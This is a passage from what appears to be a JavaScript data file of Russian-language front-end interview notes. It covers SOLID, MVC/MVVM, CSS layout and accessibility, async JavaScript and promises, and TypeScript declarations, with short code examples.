class Human implements Workable, Eatable { work() { } eat() { } }
\`\`\`

**D — Dependency Inversion:**
Зависи от абстракций, не от конкретных реализаций:
\`\`\`ts
// Плохо — зависим от конкретного класса:
class UserService {
  private db = new MySQLDatabase(); // жёсткая зависимость!
}

// Хорошо — зависим от интерфейса:
interface Database { save(data: any): void; find(id: string): any; }
class UserService {
  constructor(private db: Database) {} // MySQL, PostgreSQL, MockDB — всё работает
}
\`\`\`

**Cohesion и Coupling:**
**Cohesion (связность)** — насколько элементы внутри модуля связаны по смыслу. Хочем высокую:
\`\`\`js
// Низкая — всё свалено в одном классе:
class Utils { formatDate() {} sendEmail() {} calculateTax() {} renderButton() {} }
// Высокая — каждый класс по теме:
class DateUtils { formatDate() {} parseDate() {} }
class EmailService { send() {} validate() {} }
\`\`\`

**Coupling (зацепление)** — насколько модули зависят друг от друга. Хочем низкое:
\`\`\`js
// Высокое — сам создаёт зависимости:
class OrderService {
  constructor() {
    this.userService = new UserService();
    this.db = new MySQL();
  }
}
// Низкое — получает снаружи (DI):
class OrderService {
  constructor(userService, emailService, db) {
    this.userService = userService;
    this.db = db;
  }
}
\`\`\`
Правило: **High Cohesion + Low Coupling** = хорошая архитектура.` },
      { name: 'MVC, MVVM', level: '4', content: `Оба паттерна разделяют приложение на три роли: **Model** (данные и бизнес-логика, не знает про UI), **View** (отображение, максимально "тупое"), и посредник между ними — здесь они расходятся.

**MVC — Controller как посредник**

Поток данных:
\`\`\`
User → View → Controller → Model → (Observer) → View
\`\`\`
View подписана на Model через паттерн Observer. Model меняется → вызывает \`notify()\` → View сама перечитывает и обновляется. Controller в обратном потоке не участвует — он только принимает действия и меняет Model.
\`\`\`js
class UserModel {
  constructor() { this.users = []; this._subs = []; }
  subscribe(fn) { this._subs.push(fn); }
  addUser(user) { this.users.push(user); this._subs.forEach(fn => fn()); }
}

class UserView {
  constructor(model) {
    model.subscribe(() => this.render(model.users)); // подписка на Model
  }
  render(users) { document.body.innerHTML = users.map(u => u.name).join(', '); }
  onAddClick(cb) { document.getElementById('add').addEventListener('click', cb); }
}

class UserController {
  constructor(model, view) {
    view.onAddClick(() => model.addUser({ name: 'New' })); // только приём действий
  }
}
\`\`\`
Что даёт: Model не знает кто её слушает → одни данные можно показывать в нескольких View одновременно.

**MVVM — ViewModel как посредник**

ViewModel не знает про конкретный UI — нет ссылок на DOM-элементы. Она просто хранит **состояние представления**: отформатированные данные, флаги загрузки, вычисленные значения. Связь View ↔ ViewModel — через **декларативный двусторонний binding**: программист описывает "это поле привязано к этому свойству", фреймворк делает синхронизацию сам.
\`\`\`js
// ViewModel (Vue 3 Composition API):
const useUsersVM = () => {
  const users = ref([]);
  const isLoading = ref(false);
  const searchQuery = ref('');
  const filtered = computed(() =>
    users.value.filter(u => u.name.includes(searchQuery.value))
  );
  async function load() {
    isLoading.value = true;
    users.value = await userService.fetchUsers(); // Model
    isLoading.value = false;
  }
  return { filtered, isLoading, searchQuery, load };
};
// View — только декларативные привязки, логики нет:
// <input v-model="searchQuery" />        ← two-way binding
// <div v-if="isLoading">Загрузка...</div>
// <li v-for="u in filtered">{{ u.name }}</li>
\`\`\`
\`v-model\` под капотом — два однонаправленных потока: \`:value="name"\` + \`@input="name = $event.target.value"\`.

**React — не MVC и не MVVM**

В React нет двустороннего binding. Это идеологическая позиция — **однонаправленный поток данных**. Когда пишешь:
\`\`\`jsx
<input value={name} onChange={e => setName(e.target.value)} />
\`\`\`
Это два явных однонаправленных потока которые ты сам связал. Убери \`onChange\` — инпут залочен. В Vue/Angular \`v-model\`/\`[(ngModel)]\` делают обе связки автоматически и декларативно. React ближе к архитектуре **Flux/Redux**: \`Action → Reducer → Store → View\`.

**Сравнение:**
\`\`\`
                MVC                     MVVM
Посредник       Controller              ViewModel
Знает про UI    часто да (ссылки)       нет, только состояние
View обновляется через Observer на Model через binding с ViewModel
Фишка           слабая связанность      декларативный two-way binding
\`\`\`

**Подводные камни:**
• В классическом MVC View — активный компонент, сам подписан на Model. Пассивная View (Controller обновляет её вручную) — это уже MVP.
• ViewModel ≠ Model: Model — бизнес-данные из БД, ViewModel — отформатированная дата, флаг раскрытия, вычисленный возраст.
• Two-way binding опасен в сложных приложениях: изменил A → обновил B через binding → B обновил A → цикл. Поэтому Angular рекомендует односторонний \`[ngModel]\` + явный \`(ngModelChange)\`.
• Redux/Flux — отдельная архитектура, появившаяся как реакция на сложности MVVM в больших SPA.` },
    ],
  },
  {
    id: 'css',
    title: 'ВЁРСТКА',
    icon: '🎨',
    color: '#E44D26',
    topics: [
      { name: 'Блочная модель', level: '1', content: `Content → Padding → Border → Margin\n\n**content-box** (по умолчанию): width = только content. Padding + border добавляются сверху.\n**border-box**: width = content + padding + border. Margin НЕ входит.\n\n\`\`\`css\n*, *::before, *::after { box-sizing: border-box; }\n\`\`\`

**Margin collapsing:**
Вертикальные margins соседних блочных элементов схлопываются — берётся **больший**:
\`\`\`css
.a { margin-bottom: 20px; }
.b { margin-top: 30px; }
/* расстояние между ними = 30px, не 50px */
\`\`\`

**3 случая коллапса:**
1. Соседние siblings (братья)
2. Родитель и первый/последний ребёнок — если нет border/padding/overflow между ними
3. Пустой блок — его margin-top коллапсирует с margin-bottom

**Как предотвратить:** добавить padding/border на родителя, \`overflow: hidden\`, \`display: flex/grid\`.
Flexbox и Grid children **не коллапсируют** margins — одна из причин почему grid/flex так удобны.`, score: 4 },
      { name: 'Семантичные теги, базовые теги', level: '1', content: `Семантические теги: header, main, footer, nav, section, article, aside, figure.\n\nСемантика нужна для: доступности (скринридеры), SEO, читаемости кода.\n\n**section** — блок с конкретной смысловой нагрузкой.\n**article** — независимый контент (пост, комментарий).\n**div** — нет семантики, для группировки/стилизации.`, score: 4.5 },
      { name: 'Базовые CSS свойства', level: '1', content: `**display: none** — убирает из потока (нет размеров).\n**visibility: hidden** — скрывает, но занимает место.\n**opacity: 0** — скрывает, занимает место, реагирует на клики.\n\n**position:** static (по умолчанию), relative (смещение от своего места), absolute (от ближайшего позиционированного предка), fixed (от viewport), sticky (гибрид relative + fixed).`, score: 5 },
      { name: 'Специфичность селекторов', level: '2', content: `Формула **(a, b, c):**\n• a = id\n• b = классы, атрибуты, псевдоклассы\n• c = теги, псевдоэлементы\n\n\`!important > inline > #id > .class > tag\`\n\nПри равной специфичности → каскадность (позже = приоритетнее).`, score: 4.5 },
      { name: 'Базовые псевдоклассы', level: '2', content: `**Псевдоклассы (:)** — состояние элемента: :hover, :active, :focus, :first-child, :nth-child(n), :not(), :checked, :disabled.\n\n**Псевдоэлементы (::)** — виртуальный элемент: ::before, ::after, ::placeholder, ::selection.\n\n**:nth-child(2)** — второй потомок вообще.\n**:nth-of-type(2)** — второй элемент данного типа.\n\n**:focus** — срабатывает при любом фокусе (мышь, клавиатура, программно).\n**:focus-visible** — срабатывает только когда фокус виден пользователю — то есть при навигации с клавиатуры.\n\nЗачем: кнопки при клике мышью получают :focus и показывают outline — это раздражает. С :focus-visible outline показывается только при навигации клавиатурой — удобно для accessibility.`, score: 5 },
      { name: 'Типографика. Шрифты. Подключение шрифтов', level: '3', content: `**@font-face** — подключение локальных шрифтов:\n\`\`\`css\n@font-face {\n  font-family: 'MyFont';\n  src: url('./fonts/MyFont.woff2') format('woff2');\n  font-display: swap;\n}\n\`\`\`\n\n**Форматы:** woff2 (лучший, сжатие Brotli), woff (fallback), ttf/otf (старые).\n\n**em vs rem:**\n**em** — относительно размера шрифта родителя. Накапливается при вложенности:\n\`\`\`css\n/* Родитель 16px, дочерний 1.5em = 24px, внук 1.5em = 36px! */\n\`\`\`\n**rem** — относительно размера шрифта корневого элемента (html). Всегда предсказуемо:\n\`\`\`css\nhtml { font-size: 16px; }\n.text { font-size: 1.5rem; } /* всегда 24px */\n\`\`\`\nПоэтому rem предпочтительнее для типографики.\n\n**font-display:**\n• **auto** — браузер решает сам\n• **block** — текст невидим пока шрифт не загрузится (FOIT)\n• **swap** — сразу показывает системный шрифт, потом меняет (FOUT) ✅ чаще всего используют\n• **fallback** — короткий период невидимости (100ms), потом системный; если шрифт не успел — остаётся системный\n• **optional** — браузер сам решает показывать кастомный шрифт или нет (зависит от скорости соединения)\n\nswap — самый популярный выбор для производительности.`, score: 3.5 },
      { name: 'PostCSS', level: '3', content: `**PostCSS** — инструмент для трансформации CSS через плагины.\n\nПопулярные плагины:\n• **postcssPresetEnv** — современный CSS → полифилы (как Babel для CSS)\n• **autoprefixer** — вендорные префиксы\n• **postcssNested** — вложенность как в SASS\n• **postcssMixins** — миксины\n• **postcssImport** — @import`, score: 4 },
      { name: 'Flexbox', level: '3', content: `Одномерная раскладка (строка ИЛИ колонка).\n\n**Центрирование:** display: flex + justify-content: center + align-items: center.\n\n**align-items** — внутри одной строки.\n**align-content** — распределяет строки (только при flex-wrap: wrap).\n\n**flex: 1** = flex-grow: 1, flex-shrink: 1, flex-basis: 0%.\n\n**flex-grow** — как много элемент растёт относительно других.\n**flex-shrink** — как много элемент сжимается.\n**flex-basis** — начальный размер элемента.`, score: 4 },
      { name: 'Базовое понимание контекста наложения', level: '3', content: `**z-index** работает с позиционированными элементами (relative, absolute, fixed, sticky). Может быть отрицательным.\n\n**Stacking context** создаёт:\n• position: absolute/relative/fixed/sticky + z-index не auto\n• opacity < 1\n• transform не none\n• filter не none\n• isolation: isolate\n• will-change\n\nДочерний элемент соревнуется только внутри stacking context родителя.\n\n**Главная ловушка** — z-index работает только внутри одного контекста наложения. Элемент с z-index: 9999 не перекроет элемент из другого контекста если его родитель имеет меньший z-index.`, score: 3.5 },
      { name: 'Современные подходы к организации стилей', level: '3', content: `**CSS-Modules:** автоматические уникальные имена классов.\n**CSS-in-JS (styled-components):** стили в JS, динамика через props. Минус: runtime-стоимость.\n**Zero-runtime:** vanilla-extract, Linaria, Panda CSS — CSS-in-JS синтаксис, но компиляция в статичный CSS.`, score: 3.5 },
      { name: 'Базовые свойства Grid', level: '3', content: `Двумерная раскладка (строки И колонки одновременно).\n\n\`\`\`css\n.grid {\n  display: grid;\n  grid-template-columns: 1fr 2fr 1fr;\n  grid-template-rows: auto;\n  gap: 16px;\n}\n\`\`\`\n\n**fr** — доля свободного пространства: 1fr 2fr 1fr = 25% 50% 25%.\n\n**grid-area** — размещение элемента по именованным областям.\n**minmax(200px, 1fr)** — адаптивные колонки.\n\n**auto-fill** — создаёт колонки даже если элементов нет, пустые колонки занимают место.\n**auto-fit** — пустые колонки схлопываются до 0, существующие элементы растягиваются на всю ширину.`, score: 4 },
      { name: 'Векторная и растровая графика', level: '4', content: `**Растровая графика** — двумерный массив пикселей фиксированного размера. Файл хранит цвет каждого пикселя (RGB/RGBA) плюс сжатие. При масштабировании браузер интерполирует — пикселизация.

**Векторная графика** — инструкции для рисования: "нарисуй круг радиуса 50, залей синим". Браузер выполняет их на любом масштабе → бесконечное масштабирование без потерь.

\`\`\`
                   Растр              Вектор
Масштабирование    Пикселизуется      Без потерь
Размер зависит от  Разрешения         Сложности рисунка
Подходит для       Фото, текстур      Иконок, логотипов
\`\`\`

**Растровые форматы:**
**JPEG** — lossy, для фото с большой палитрой. Нет прозрачности. Артефакты на резких границах (текст, иконки).
**PNG** — lossless, с прозрачностью. Для скриншотов UI, диаграмм, резких границ.
**WebP** — на 25-35% легче JPG/PNG при том же качестве. Lossy + lossless + прозрачность + анимация. Поддержка ~96%.
**AVIF** — на ~50% агрессивнее JPG. Медленнее кодируется. Поддержка ~93%. Постепенно вытесняет WebP в проде.
**GIF** — устаревший. 256 цветов, большой размер. Заменён WebP и \`<video autoplay muted>\`.

**SVG** — единственный массовый векторный формат. Это XML-текст:
• Inline в HTML → стилизация через CSS (\`fill\`, \`stroke\`, анимации), манипуляция через JS
• Хорошо жмётся gzip
• Для сложных иллюстраций (тысячи путей) становится тяжёлым — не для фото

**Адаптивные изображения — проблема:**
Одна \`<img src="photo.jpg">\` на мобилке занимает 300px, но качает 200 КБ под десктоп. На Retina (DPR=2) обычный JPG размытый.

**Решение — \`srcset\` по ширине (\`w\`-дескриптор):**
\`\`\`html
<img
  src="photo-800.jpg"
  srcset="photo-400.jpg 400w, photo-800.jpg 800w, photo-1600.jpg 1600w"
  sizes="(max-width: 600px) 100vw, 50vw"
  alt="...">
\`\`\`
\`srcset\` — список файлов с реальной шириной. \`sizes\` — подсказка браузеру какой ширины будет картинка. Браузер сам выбирает оптимальный файл с учётом DPR.

**По плотности (\`x\`-дескриптор)** — для фиксированных размеров (логотипы):
\`\`\`html
<img src="logo.png" srcset="logo.png 1x, logo@2x.png 2x" alt="Logo">
\`\`\`

**\`<picture>\`** — выбор формата под поддержку браузером:
\`\`\`html
<picture>
  <source srcset="photo.avif" type="image/avif">
  <source srcset="photo.webp" type="image/webp">
  <img src="photo.jpg" alt="...">
</picture>
\`\`\`
Браузер берёт первый поддерживаемый \`<source>\`. \`<img>\` — обязательный fallback и носитель \`alt\`.

**Комбинация в проде** — \`<picture>\` за формат, \`srcset\` внутри за размер:
\`\`\`html
<picture>
  <source type="image/avif"
    srcset="photo-400.avif 400w, photo-800.avif 800w"
    sizes="(max-width: 600px) 100vw, 50vw">
  <source type="image/webp"
    srcset="photo-400.webp 400w, photo-800.webp 800w"
    sizes="(max-width: 600px) 100vw, 50vw">
  <img src="photo-800.jpg"
    srcset="photo-400.jpg 400w, photo-800.jpg 800w"
    sizes="(max-width: 600px) 100vw, 50vw"
    alt="...">
</picture>
\`\`\`

**Подводные камни:**
• CSS resize ≠ оптимизация. \`<img style="width:50px">\` на 200 КБ JPG всё равно качает 200 КБ
• SVG в проде — почти всегда inline. \`<img src="icon.svg">\` загружает SVG как изолированный документ — внешние стили не действуют, \`currentColor\` не работает
• PNG для скриншотов UI, не JPG — JPG размывает резкие границы и текст
• \`sizes\` обязателен при \`w\`-дескрипторах — без него браузер выберет самый широкий файл
• \`loading="lazy"\` не для LCP-элемента — для первого экрана используй \`fetchpriority="high"\`
• \`alt=""\` — валидно для декоративных изображений, screen reader пропустит`, score: 2 },
      { name: 'browserslist', level: '4', content: `Конфиг, определяющий целевые браузеры. Читают: Autoprefixer, Babel, PostCSS Preset Env, ESLint.\n\n\`\`\`json\n"browserslist": ["> 1%", "last 2 versions", "not dead"]\n\`\`\`\n\n• **> 1%** — браузеры с долей использования больше 1% глобально\n• **last 2 versions** — последние 2 версии каждого браузера\n• **not dead** — исключает браузеры без официальной поддержки более 2 лет\n\nВсе инструменты работают согласованно по одному конфигу.\n\n**Где хранить:**\n• **.browserslistrc** — отдельный файл\n• **package.json** — поле "browserslist"\n• **в конфиге инструмента** — например в postcss.config.js`, score: 2.5 },
      { name: 'Доступность (aria, tabindex & etc.)', level: '4', content: `Скринридер, голосовое управление и brl-дисплей работают через accessibility tree — структуру, которую браузер строит из семантики HTML. Нативные теги (\`<button>\`, \`<nav>\`, \`<input>\`) попадают туда автоматически с правильной ролью и поведением. Кастомный виджет на \`<div>\` — нет: AT видит просто безымянный блок и не может рассказать пользователю ни что это, ни в каком состоянии. ARIA-атрибуты — способ дописать эту информацию вручную: объявить роль, передать состояние, связать элементы между собой.

**WAI-ARIA** — набор HTML-атрибутов, добавляющих семантику для assistive technologies (скринридеры, голосовое управление, brl-дисплеи).
**tabindex** — атрибут, управляющий порядком и доступностью фокуса при клавиатурной навигации.

**Правило №1 ARIA:** если есть нативный HTML-элемент — используй его, а не \`role\` поверх \`<div>\`. \`<button>\` всегда лучше чем \`<div role="button" tabindex="0">\` — нативный сам фокусируется, сам обрабатывает Enter/Space, сам имеет семантику.

**Три группы ARIA-атрибутов:**

**Roles — "что это за элемент"**
\`\`\`html
<div role="button">Клик</div>
<div role="dialog" aria-modal="true">...</div>
<ul role="tablist"><li role="tab" aria-selected="true">Вкладка 1</li></ul>
\`\`\`
Частые: \`button\`, \`dialog\`, \`alert\`, \`tablist\`/\`tab\`/\`tabpanel\`, \`combobox\`, \`listbox\`/\`option\`, \`tooltip\`, \`progressbar\`.

**States — "в каком состоянии элемент сейчас"** (меняются динамически, AT анонсирует изменения)
\`\`\`html
<button aria-expanded="false" aria-controls="menu-1">Меню</button>
<input aria-invalid="true" aria-describedby="error-msg">
<div role="checkbox" aria-checked="false">Согласен</div>
\`\`\`
Частые: \`aria-expanded\`, \`aria-checked\`, \`aria-selected\`, \`aria-pressed\`, \`aria-disabled\`, \`aria-hidden\`, \`aria-invalid\`, \`aria-busy\`.

**Properties — "как элемент описан и связан"** (обычно статичные)
• \`aria-label\` — подпись когда нет видимого текста (иконка-кнопка)
• \`aria-labelledby\` — id другого элемента, чей текст станет подписью
• \`aria-describedby\` — id элемента с дополнительным описанием (ошибки, подсказки)
• \`aria-controls\` — этот элемент управляет другим (по id)
• \`aria-live\` — регион, изменения в котором AT анонсирует автоматически (тосты, уведомления)

**Эвристика state vs property:** state меняется в ответ на действие (\`aria-expanded\` true/false при клике), property описывает элемент в принципе (\`aria-labelledby\` — связь с лейблом).

**tabindex: три значения**

\`tabindex="-1"\` — фокусируемый программно (\`element.focus()\`), Tab пропускает. Для: открытия модалки (ставим фокус на обёртку), skip-link цели (\`<main tabindex="-1">\`), блока ошибок после submit.

\`tabindex="0"\` — в Tab-цепочке в DOM-порядке. Нужен для кастомных интерактивных элементов:
\`\`\`html
<div role="button" tabindex="0" onclick="..." onkeydown="...">Кастомная кнопка</div>
\`\`\`
Добавив \`tabindex="0"\`, обязан реализовать клавиатурное поведение — Enter/Space, стрелки, Escape.

\`tabindex >= 1\` — антипаттерн. Переопределяет DOM-порядок, превращается в ад поддержки, ломается при композиции. Правильное решение: менять порядок в DOM, не в tabindex.

**Focus management:**
• **Focus trap** — Tab из последнего элемента модалки возвращает к первому, не уходит на страницу позади. Нативный \`<dialog>\` имеет встроенный focus trap.
• **Focus restoration** — после закрытия модалки фокус возвращается на элемент который её открыл: \`const saved = document.activeElement\` → после закрытия \`saved.focus()\`.
• **\`:focus-visible\`** — outline только при клавиатуре, не при клике мышью:
\`\`\`css
button:focus { outline: none; }
button:focus-visible { outline: 2px solid; }
\`\`\`

**Skip-link — обязательная практика:**
\`\`\`html
<a href="#main" class="skip-link">Перейти к контенту</a>
<main id="main" tabindex="-1">...</main>
\`\`\`
\`\`\`css
.skip-link { position: absolute; left: -9999px; }
.skip-link:focus { left: 0; }
\`\`\`

**aria-live для динамических уведомлений:**
\`\`\`html
<div aria-live="polite">Загрузка завершена</div>     <!-- ждёт паузы -->
<div aria-live="assertive">Критическая ошибка!</div>  <!-- прерывает сразу -->
\`\`\`

**Подводные камни:**
• ARIA не делает элемент функциональным — \`role="button"\` не добавляет обработку Enter. Только описывает для AT.
• \`aria-hidden="true"\` не вешать на фокусируемые элементы — фокус прыгает на "невидимый" элемент, пользователь теряется.
• \`aria-label\` перебивает текстовое содержимое — скринридер читает label, не текст кнопки. Только для иконок без текста.
• Семантические заголовки не пропускать — AT строят оглавление по h1→h2→h3, пользователь навигирует по ним.
• WCAG контраст: 4.5:1 для обычного текста, 3:1 для крупного (18px+) и UI элементов.
• Тестировать с реальным скринридером: NVDA (Windows), VoiceOver (macOS/iOS), TalkBack (Android).`, score: 3 },
    ],
  },
  {
    id: 'async',
    title: 'АСИНХРОННОСТЬ',
    icon: '🔄',
    color: '#FF6B6B',
    topics: [
      { name: 'XMLHttpRequest, fetch', level: '2', content: `**XMLHttpRequest** — колбэки. **fetch** — промисы.\n\n**fetch при 404/500 — НЕ попадает в catch!** Только сетевые ошибки. Проверять response.ok.\n\n\`\`\`js\nfetch('/api').then(res => {\n  if (!res.ok) throw new Error(res.status);\n  return res.json();\n}).catch(err => console.log(err));\n\`\`\`\n\n**Отмена запроса:**\n\n XHR — просто:\n\`\`\`js\nxhr.abort();\n\`\`\`\n\nfetch — через AbortController:\n\`\`\`js\nconst controller = new AbortController();\n\nfetch('/api/data', { signal: controller.signal });\n\n// Отменяем запрос\ncontroller.abort();\n\`\`\`\nAbortController универсальнее — работает с любым Promise-based API.`, score: 3.5 },
      { name: 'Механизм Event loop, тасоки и микротасоки', level: '3', content: `**Один тик Event Loop:**\nМакротаска → Все микротаски → rAF → Рендеринг → Следующая макротаска\n\n**Микротаски:** Promise.then, queueMicrotask, MutationObserver. Опустошаются полностью.\n**rAF:** requestAnimationFrame — перед рендером, НЕ микро и НЕ макро.\n**Макротаски:** setTimeout, setInterval, I/O.\n\nМикротаска может породить микротаску → выполнится до макротаски. Бесконечные микротаски → блокировка.`, score: 4 },
      { name: 'async/await: Синтаксис, обработка ошибок', level: '3', content: `async-функция всегда возвращает Promise.\n\n**await** разрезает функцию: до await — синхронно, после await — микротаска (.then()).\n\n\`\`\`js\nasync function foo() { console.log(1); await x; console.log(2); }\nconsole.log(3); foo(); console.log(4);\n// 3, 1, 4, 2\n\`\`\`\n\n**Обработка ошибок:** try/catch или .catch() на промисе.\n\n**return value vs return Promise.resolve(value):** второй на один микротик медленнее.\n\n**Promise методы:**\n• **Promise.all(promises)** — ждёт все, падает при первой ошибке. Результат: массив значений в том же порядке.\n• **Promise.allSettled(promises)** — ждёт все, не падает. Результат: массив {status, value/reason}.\n• **Promise.race(promises)** — возвращает первый завершившийся (fulfilled и rejected). Остальные игнорируются.\n• **Promise.any(promises)** — возвращает первый успешный. Если все упали — AggregateError.\n• **Promise.resolve(value)** — создаёт уже зарезолвленный Promise.\n• **Promise.reject(reason)** — создаёт уже отклонённый Promise.\n\n**Нюансы:**\n\`\`\`js\nPromise.race([rejected, resolved]) // вернёт rejected — первый завершился\nPromise.any([rejected, resolved])  // вернёт resolved — первый успешный\n\`\`\`\nPromise.all — порядок результатов совпадает с порядком промисов, не с порядком завершения:\n\`\`\`js\nconst [a, b] = await Promise.all([slowRequest, fastRequest]);\n// a — результат slowRequest, b — fastRequest\n\`\`\`\nPromise.allSettled — никогда не попадёт в .catch().\nPromise.any — единственный метод который бросает AggregateError (содержит массив всех ошибок).\n\n**Цепочка .then().catch().finally():**\n\`\`\`js\nfetch('/api')\n  .then(res => res.json())          // трансформация\n  .catch(err => fallback)           // обработка ошибки, возвращает значение — цепочка продолжается!\n  .finally(() => setLoading(false)) // выполняется всегда, не получает значение\n\`\`\`\n\n**После .catch() можно продолжить .then()** — если catch не бросает ошибку, цепочка восстанавливается:\n\`\`\`js\nfetch('/api')\n  .then(res => res.json())\n  .catch(err => ({ error: true }))  // вернули fallback-значение\n  .then(data => render(data))       // выполнится с fallback-значением\n\`\`\`\nЕсли внутри .catch() сделать throw — следующие .then() будут пропущены до следующего .catch().`, score: 4 },
      { name: 'Генераторы и итераторы', level: '4', content: `**Два протокола:**\n• **Iterable** — объект с методом [Symbol.iterator]() возвращающим итератор\n• **Iterator** — объект с методом next() возвращающим { value, done }\n\n**Ручная реализация итератора:**\n\`\`\`js\nconst iterable = {\n  [Symbol.iterator]() {\n    let i = 0;\n    return {\n      next() {\n        return i < 3\n          ? { value: i++, done: false }\n          : { value: undefined, done: true };\n      }\n    };\n  }\n};\n\`\`\`\n\n**Генератор** — автоматически реализует оба протокола:\n\`\`\`js\nfunction* gen() {\n  const x = yield 'first';  // строка 1\n  const y = yield 'second'; // строка 2\n  return x + y;             // строка 3\n}\nconst g = gen();\n\`\`\`\n\n**g.next()** — запуск (первый аргумент всегда игнорируется):\n• Идёт до первого yield, возвращает \`{ value: 'first', done: false }\`\n• Заморожен на строке 1\n\n**g.next('world')** — продолжение:\n• 'world' → результат yield 'first' → x = 'world'\n• Идёт до следующего yield, возвращает \`{ value: 'second', done: false }\`\n\n**g.next('!')** — продолжение:\n• '!' → результат yield 'second' → y = '!'\n• Идёт до return, возвращает \`{ value: 'world!', done: true }\`\n\n**Правило:** то что передаёшь в next() — становится результатом предыдущего yield.\n\n**yield* — делегирование:**\n\`\`\`js\nfunction* outer() {\n  yield 0;\n  yield* [1, 2, 3];  // массив\n  yield* 'abc';       // строка\n  yield* inner();     // другой генератор\n}\n[...outer()]; // [0, 1, 2, 3, 'a', 'b', 'c']\n\`\`\`\n\n**Что работает с итерируемыми:** for...of, [...spread], Array.from(), деструктуризация.\n**Встроенные итерируемые:** Array, String, Map, Set, arguments, NodeList, генераторы.\n\n**Практика:**\n\`\`\`js\nfunction* idGenerator() {\n  let id = 1;\n  while (true) yield id++;\n}\n\nfunction* range(start, end) {\n  while (start <= end) yield start++;\n}\nfor (const num of range(1, 5)) console.log(num); // 1 2 3 4 5\n\`\`\`\n\n**Применение:** Redux-Saga, бесконечные последовательности, ленивые вычисления. async/await под капотом — Babel компилирует в генераторы + промисы.`, score: 2.5 },
      { name: 'Работа с запросами', level: '2', content: `**Промисы — цепочки:**\n• .then() и .catch() всегда возвращают новый промис\n• Ошибка пропускает все .then() до ближайшего .catch()\n• .catch() без throw — «чинит» цепочку\n• .finally() — всегда, не получает аргументов, пропускает значение дальше\n\n**promise.then(ok, err) vs promise.then(ok).catch(err):**\nВ первом: err НЕ ловит ошибки из ok. Во втором: catch ловит всё.

**Promise combinators:**
\`\`\`js
// Все выполнятся — вернёт массив результатов. Один reject → всё reject.
const [user, posts] = await Promise.all([fetchUser(id), fetchPosts(id)]);

// Все выполнятся — вернёт массив { status, value/reason }. Никогда не reject.
const results = await Promise.allSettled([req1(), req2(), req3()]);
const ok = results.filter(r => r.status === 'fulfilled').map(r => r.value);

// Первый завершившийся (resolve ИЛИ reject) побеждает.
const data = await Promise.race([fetchFromPrimary(), fetchFromFallback()]);

// Первый resolve побеждает. Reject только если ВСЕ упали (AggregateError).
const fastest = await Promise.any([cdn1(), cdn2(), cdn3()]);
\`\`\`

**AbortController** — отмена fetch и любых async операций:
\`\`\`js
const controller = new AbortController();

fetch('/api/data', { signal: controller.signal })
  .catch(e => { if (e.name !== 'AbortError') throw e; });

controller.abort(); // отмена

// В React — отменяем при размонтировании (обязательный паттерн!)
useEffect(() => {
  const controller = new AbortController();
  fetch('/api', { signal: controller.signal }).then(setData);
  return () => controller.abort();
}, []);
\`\`\`` },
    ],
  },
  {
    id: 'ts',
    title: 'TS',
    icon: '🔷',
    color: '#3178C6',
    topics: [
      { name: 'Основные типы данных в TS', level: '2', content: `**Примитивы:** string, number, boolean, null, undefined, bigint, symbol.\n\n**TS-specific:**\n• **any** — отключает проверку\n• **unknown** — безопасный any, требует проверки типа\n• **never** — функция никогда не завершится (throw, while(true))\n• **void** — функция ничего не возвращает\n• **tuple** — массив фиксированной длины: [string, number]\n• **enum** — набор именованных констант`, score: 3 },
      { name: 'Keyof, typeof', level: '2', content: `**keyof** — union ключей: keyof User → 'name' | 'age' (НЕ string!)\n**typeof** (в TS) — выводит тип из значения: typeof user → { name: string; age: number }\n\n**Комбинация:** keyof typeof obj → union ключей из значения.`, score: 3.5 },
      { name: 'Interface vs types (extend, |, &)', level: '3', content: `**interface** — declaration merging (повторное объявление объединяется), extends.\n**type** — расширение через &, union |, mapped types, conditional types.\n\n**Union (|):** A или B (или оба).\n**Intersection (&):** обязательно A и B.\n\ntype тоже можно implements в классах.`, score: 3.5 },
      { name: 'Файлы деклараций .d.ts', level: '3', content: `**.d.ts** — файл только с типами, без реализации. TypeScript читает его чтобы знать что экспортирует модуль, но в JS-бандл он не попадает.\n\n**Зачем нужны:**\nJS-библиотека написана на JS — TypeScript не знает её типы. .d.ts даёт ему эту информацию. Можно типизировать любой JS-код не переписывая его.\n\n**Три источника .d.ts:**\n\n**1. Встроены в саму библиотеку** — авторы написали на TypeScript и скомпилировали:\n\`\`\`json\n// package.json библиотеки\n{ "types": "./dist/index.d.ts" }\n\`\`\`\nTS находит это автоматически.\n\n**2. @types/* пакеты** — отдельный пакет с декларациями для JS-библиотек:\n\`\`\`bash\nnpm i -D @types/react @types/node\n\`\`\`\nPostedBy сообщество DefinitelyTyped. Устанавливаются как devDependency — в продакшн-бандл не попадают.\n\n**3. Написаны вручную** — для своего JS-кода или внутренних модулей:\n\`\`\`ts\n// legacy.d.ts — типизируем старый JS-модуль\ndeclare module './legacy/utils' {\n  export function formatDate(date: Date): string;\n  export function parseId(id: unknown): number;\n}\n\`\`\`\n\n**declare — ключевое слово в .d.ts:**\nГоворит TS "это существует в рантайме, доверяй мне":\n\`\`\`ts\n// Объявить переменную без значения:\ndeclare const __DEV__: boolean;        // например, вшитая webpack-ом\ndeclare function require(id: string): any;\n\n// Объявить модуль (любой импорт этого пути → any):\ndeclare module '*.svg' {\n  const src: string;\n  export default src;\n}\n\n// Объявить модуль с типами:\ndeclare module 'my-lib' {\n  export interface Options { timeout: number; }\n  export function init(opts: Options): void;\n}\n\`\`\`\n\n**declare global — расширение глобального namespace:**\n\`\`\`ts\n// Добавить свойство к window:\ndeclare global {\n  interface Window {\n    analytics: Analytics;\n    __APP_CONFIG__: AppConfig;\n  }\n}\n\n// Или расширить существующий тип:\ndeclare global {\n  interface Array<T> {\n    groupBy(key: keyof T): Record<string, T[]>;\n  }\n}\n\`\`\`\nВажно: declare global работает только внутри module-файла (с import/export). В глобальном файле — просто interface Window.\n\n**Автогенерация .d.ts из своего кода:**\n\`\`\`json\n// tsconfig.json\n{ "declaration": true, "declarationDir": "./dist/types" }\n\`\`\`\nПри сборке библиотеки tsc генерирует .d.ts автоматически рядом с JS-файлами. Потребители получат типы без @types.\n\n**Нюанс — ambient vs module declarations:**\nЕсли .d.ts файл не содержит import/export — он ambient (глобальный), типы доступны везде без импорта. Если содержит import/export — это module, типы нужно импортировать явно.`, score: 3 },
      { name: 'Механизм typeGuard, type cast', level: '3', content: `**Type Guard:** функция с type predicate:\n\`\`\`ts\nfunction isCat(x: Cat | Dog): x is Cat { return 'meow' in x; }\n\`\`\`\n\n**Type Cast:** \`as\` (основной) и \`<Type>\` (не работает в JSX).\nЭто утверждение, не преобразование — в рантайме ничего не происходит.`, score: 3.5 },
      { name: 'UtilityTypes', level: '3', content: `**Partial<T>** — все поля необязательны
